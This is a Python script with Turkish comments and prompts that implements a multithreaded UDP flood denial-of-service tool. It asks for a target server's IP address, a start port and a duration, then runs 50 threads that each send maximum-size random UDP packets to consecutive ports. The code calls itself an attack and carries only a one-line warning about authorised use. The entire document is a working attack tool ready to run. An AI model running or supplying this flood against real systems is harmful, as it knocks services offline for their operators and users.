# -*- coding: utf-8 -*-
import socket
import random
import os
import time
import threading

# UDP flood fonksiyonu
def udp_flood(ip, port, packet_size, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_data = os.urandom(packet_size)  # Maksimum paket boyutu (65500 byte)
    start_time = time.time()

    sent = 0
    while time.time() - start_time < duration:
        try:
            sock.sendto(bytes_data, (ip, port))  # UDP paketi gönderme
            sent += 1
            if sent % 100 == 0:
                print(f"Gönderilen paket sayısı: {sent} - IP: {ip} Port: {port}")
        except Exception as e:
            print(f"Hata oluştu: {e}")
            break

    print(f"Test bitti: {sent} paket gönderildi. IP: {ip}, Port: {port}")

# Sunucuya yönelik flood fonksiyonu
def udp_flood_server(ip, start_port, packet_size, duration, num_threads=50):
    threads = []

    print("Saldırı başlatılıyor! Farklı portlardan yoğun trafik gönderilecek...")

    # Sunucuya yönelik flood
    for i in range(num_threads):
        port = start_port + i
        t = threading.Thread(target=udp_flood, args=(ip, port, packet_size, duration))
        threads.append(t)
        t.start()

    # Tüm thread'lerin bitmesini bekle
    for t in threads:
        t.join()

    print(f"Saldırı tamamlandı. Sunucuya toplamda {num_threads} farklı port üzerinden yoğun trafik gönderildi.")

# Kullanıcı girişi için fonksiyon
def get_input():
    ip = input("Hedef sunucu IP adresini girin: ")  # Sunucu IP adresi
    start_port = int(input("Başlangıç portunu girin: "))
    packet_size = 65500  # UDP paket boyutu (en yüksek boyut)
    duration = int(input("Test süresini girin (saniye cinsinden): "))
    num_threads = 50  # 50 farklı port üzerinden saldırı yapacağız
    return ip, start_port, packet_size, duration, num_threads

# Kullanıcıya saldırı hakkında bilgi ver
def print_info():
    print(" Uyarı: Bu test, sadece izinli ortamlar ve sunucular üzerinde yapılmalıdır. ")
    print(" Gerçek bir hedefe saldırmak yasa dışıdır. ")
    print("Saldırı başlatılıyor... Lütfen sabırlı olun.")
    time.sleep(3)

# Ana fonksiyon
def main():
    # Kullanıcıdan bilgiler alınır
    ip, start_port, packet_size, duration, num_threads = get_input()

    # Kullanıcıya bilgi ver
    print_info()

    # Flood saldırısını başlat
    udp_flood_server(ip, start_port, packet_size, duration, num_threads)

    print("Saldırı başarıyla tamamlandı! Test süresi bitti.")

if __name__ == "__main__":
    main()